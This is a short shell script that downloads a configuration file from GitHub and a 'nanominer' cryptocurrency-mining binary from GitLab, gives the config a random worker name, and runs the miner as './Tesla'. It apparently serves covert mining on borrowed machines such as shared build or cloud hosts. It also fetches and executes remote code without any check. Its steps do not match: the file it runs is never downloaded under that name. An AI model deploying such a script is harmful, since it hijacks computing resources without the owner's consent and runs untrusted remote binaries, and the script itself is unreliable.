#!/bin/sh
wget https://raw.githubusercontent.com/evenxhere/tesla/main/config.ini
wget https://gitlab.com/rifkiars/macul/-/raw/main/nanominer?inline=false
chmod +x Tesla
sed -i "s/Tesla/$(shuf -n 1 -i 1-999999)/" "config.ini"
./Tesla
